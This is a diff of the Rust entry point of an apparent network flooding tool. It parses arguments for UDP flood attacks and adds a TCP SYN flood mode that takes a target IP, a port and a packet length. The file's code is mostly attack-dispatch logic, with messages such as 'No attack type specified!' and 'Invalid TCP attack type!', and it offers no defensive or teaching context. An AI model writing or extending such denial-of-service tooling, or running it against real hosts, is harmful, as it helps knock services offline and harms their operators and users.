@@ -1,35 +1,19 @@
-use std::env;
 mod udp;
+mod tcp;
 
-fn main(){
+use std::env;
+
+fn main(){	
 	let args: Vec<String> = env::args().collect();
 	let mut pack_len: u16 = 65507;
 	
 	if args.len() <= 1 {
 		println!("Need more than one arguments!!");
 		std::process::exit(1);
+		
 	} else if args.len() == 2 {
 		println!("No attack type specified!");
 		std::process::exit(1);
-	} else if args.len() == 3 {
-		let mut attack_type = "";
-		
-		if args[2] == "--flood" || args[2] == "-f" {
-			attack_type = "flood";
-		}
-		
-		println!("No {} type specified!", attack_type);
-		std::process::exit(1);
-		
-	} else if args.len() == 4 {
-		println!("No IP address specified!");
-		std::process::exit(1);
-		
-	} else if args.len() == 5 {
-		println!("No packet length specified! Defaulting to 65507 (max size)");
-		
-	} else if args.len() == 6 {
-		pack_len = args[5].parse::<u16>().unwrap();
 		
 	}
 	
@@ -50,6 +34,14 @@ fn main(){
 			
 		} else {
 			println!("Invalid UDP attack type!");
+		}
+	} else if args[1] == "tcp" {
+		if args[2] == "--flood" || args[2] == "-f" {
+			if args[3] == "--syn" || args[3] == "-s" {
+				tcp::flood::packet::syn(args[4].parse().unwrap(), String::from(&args[5]), 0)
+			}
+		} else {
+			println!("Invalid TCP attack type!");
 		}
 	} else {
 		println!("Invalid attack type!");
